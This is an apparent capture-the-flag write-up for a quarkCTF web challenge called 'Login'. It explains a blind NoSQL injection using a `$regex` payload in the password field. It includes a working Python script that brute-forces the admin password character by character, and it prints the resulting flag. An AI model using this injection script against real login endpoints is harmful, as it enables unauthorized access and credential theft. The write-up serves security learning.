Login
=

Our admin belives his app is secure, please prove him wrong.

### Website: https://login.ctf.teamquark.com/

### Author: Apoorva Pendse and Gourav Suram

### Files: [web_login.zip](./web_login.zip)

Solution
=

Looking at the source code, we dont see any particular way to login, so I looked up on google on how to login in such kind of questions. The suddenly, `blind nosqli` popped up in my mind.

I then made a bold assumption stating that `admin` will be the username and the flag with be the password. And this is where all lights became bright and everything made sense.

I quickly set the username to admin and password to `{"$regex":"^<flag>"}` where we can bruteforce each character. I then made a script to do that:

```py
import requests
import urllib3
import string
import urllib

flag = list("")
url = "https://login.ctf.teamquark.com/api/login"
headers = {'content-type': 'application/json'}

while True:
    for c in string.printable:
        print (f"trying : {''.join(flag) + c}")
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "admin"}, "password": {"$regex": "^%s" }}' % (''.join(flag) + c)
            req = requests.post(url, data = payload, headers = headers, verify = False, allow_redirects = False)
            if 'Login Successful' in req.text:
                flag.append(c)
                break
```

After a lot of warnings, we finally get the flag!

`quarkCTF{n0sqL_sur3_i5_fun}`
